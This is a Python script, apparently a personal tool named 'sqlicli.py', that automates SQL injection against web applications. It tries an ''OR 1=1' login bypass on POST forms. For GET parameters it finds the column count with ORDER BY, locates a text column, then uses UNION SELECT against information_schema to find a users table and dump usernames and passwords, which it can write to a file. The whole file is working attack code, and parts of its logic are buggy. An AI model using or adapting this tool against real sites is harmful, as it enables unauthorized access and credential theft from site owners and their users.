import requests
import urllib3
from bs4 import BeautifulSoup
import re
import argparse
import sys
from diff import difference

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def has_parameters(url):
    if '?' in url:
        base_url, params_str = url.split('?', 1)
        if '=' in params_str:
            return True
    return False

def perform_request(url, sql_payload, method, post_data=None):
    if method == 'GET':
        r = requests.get(url + sql_payload, verify=False, proxies=proxies)
    elif method == 'POST':
        r = requests.post(url, data=post_data, verify=False, proxies=proxies)
    else:
        raise ValueError("Invalid method specified.")
    return r

def try_login(url, method, post_data):
    sql_payload="'OR 1=1 # "
    def get_csrf_token(url):
        r = requests.get(url, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input")['value']
        return csrf
    try:
        csrf = get_csrf_token(url)
        if csrf:
            data = {"csrf": csrf}
            data.update({key: value for key, value in (item.split('=') for item in post_data.split('&'))})
            data[list(data.keys())[1]] = sql_payload
            print(data)
        res = perform_request(url,sql_payload, method, data)
    
    finally:
        post_data[list(post_data.keys())[0]] = sql_payload
        print(post_data)
        res = perform_request(url, sql_payload,method, post_data)
        if res.status_code == 200:
            return True,sql_payload
        else:
            return False          

def exploit_sqli_column_number(url, method, post_data=None):
    if method == 'GET':
        for i in range(1, 50):
            sql_payload = "'+order+by+%s--" % i
            r = requests.get(url + sql_payload, verify=False, proxies=proxies)
            if r.status_code == 500:
                if i - 1 == 0:
                    return "one column"
                return i - 1

def exploit_sqli_string_field(url, num_col, method, post_data=None):
    if method == 'GET':
        for i in range(1, num_col + 1):
            string = "'v2F6UA'"
            payload_list = ['null'] * num_col
            payload_list[i - 1] = string
            sql_payload = "' union select " + ','.join(payload_list) + "--"
            r = requests.get(url + sql_payload, verify=False, proxies=proxies)
            res = r.text
            if string.strip('\'') in res:
                return i
        return False

def generate_sql_payload(num_columns, text_column_index, detail, users_table=None):
    null_columns = ["NULL"] * num_columns
    null_columns[text_column_index - 1] = detail
    if detail == "table_name":
        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM information_schema.tables--"
    elif detail == "column_name":
        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + f" FROM information_schema.columns WHERE table_name = '{users_table}'--"
    elif detail == "all":
        null_columns[text_column_index - 1] = "CONCAT(username, '~~', password)"
        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM users--"
    return sql_payload

def exploit_sqli_users_table(url, method, post_data=None):
    global num_col
    num_col = exploit_sqli_column_number(url, method, post_data)
    if num_col:
        global string_column
        string_column = exploit_sqli_string_field(url, num_col, method, post_data)
        if string_column:
            sql_payload = generate_sql_payload(num_col, string_column, "table_name")
            res = perform_request(url, sql_payload, method, post_data)
            soup = BeautifulSoup(res.text, 'html.parser')
            users_table = soup.find(text=re.compile('.*users.*'))
            return users_table, num_col, string_column
    return None, None, None

def exploit_sqli_users_columns(url, users_table, method, num_col, string_column):
    sql_payload = generate_sql_payload(num_col, string_column, "column_name", users_table)
    res = perform_request(url, sql_payload, method)
    soup = BeautifulSoup(res.text, 'html.parser')
    username_column = soup.find(text=re.compile('.*username.*'))
    password_column = soup.find(text=re.compile('.*password.*'))
    return username_column, password_column

def exploit_sqli_user_cred(url, users_table, username_column, password_column, method='GET', post_data=None):
    sql_payload = generate_sql_payload(num_col, string_column, "all", users_table)
    res = perform_request(url, sql_payload, method, post_data)
    res1 = requests.get(url)
    soup = BeautifulSoup(res.text, 'html.parser')
    soup2 = BeautifulSoup(res1.text, 'html.parser')
    output = difference(str(soup), str(soup2))
    return output

def save_to_file(content):
    file_path = input("Enter file path to save results (press enter to skip): ")
    if file_path:
        with open(file_path, 'w') as file:
            file.write(str(content))
        print("Results saved to file.")

def main():
    parser = argparse.ArgumentParser(description="SQL Injection Exploiter")
    parser.add_argument('-u', help='Enter URL', dest='url')
    parser.add_argument('-m', help='Enter method', dest='method')
    parser.add_argument('-d', help='Enter post data', dest='post_data')
    parser.add_argument('-o', help='save file', dest='file', action="store_true")
    args = parser.parse_args()
    arged = False
    def help():
        print("\033[92mSQL INJECTION\033[0m")
        print ('''usage: sqlicli.py [-h] [-u URL] [-m METHOD] [-d POST_DATA]

        optional arguments:
        -h, --help    show this help message and exit
        -u URL        Enter url
        -m METHOD     Enter request method
        -d DATA       Enter your post data''')

    if not arged:
        help()
    method= args.method
    output = args.file
    url = args.url
    data = args.post_data

    method = 'GET' if not args.method else 'POST'
    if method.upper() == 'POST' and data is None:
        print("Please provide POST data for the selected method.")
        sys.exit(1)




    if method == 'POST':
        try_login_option = True
        print("\n")
        if data is None:
            print("Please enter post data)\n")
        try:
                post_data = {key: value for key, value in (item.split('=') for item in data.split('&'))}
                if not('username' in post_data and 'password' in post_data):
                    return False
                                
        except:
                print("Incorrect Post format (e.g username=user&password=pass)\n")
                return           
        if try_login_option:  
            login_successful = try_login(url, method, post_data)
            if login_successful[0]:
                print("[+] Login Successful!")
                print(f"[+] Payload = {login_successful[1]}")
            else:
                print("[-] Login Failed. Stopping execution.")
                sys.exit(1)
        else:
            print("[-] Please select try login option.")
            sys.exit(1)

    if method.upper() == 'GET':
        if has_parameters(url):
            users_table, num_col, string_column = exploit_sqli_users_table(url, method)
            if users_table:
                print("Found the users table")
                print(f"Users Table: {users_table}")
                username_column, password_column = exploit_sqli_users_columns(url, users_table, method, num_col, string_column)
                if username_column and password_column:
                    print(f"Username Column: {username_column}")
                    print(f"Password Column: {password_column}")
                    user_cred = exploit_sqli_user_cred(url, users_table, username_column, password_column, method)
                    if user_cred:
                        print("[+] The username and password are as below: \n")
                        for value in user_cred:
                            print("[+] %s\n" % value)
                    if output:
                        save_to_file(user_cred)
if __name__ == '__main__':
    main()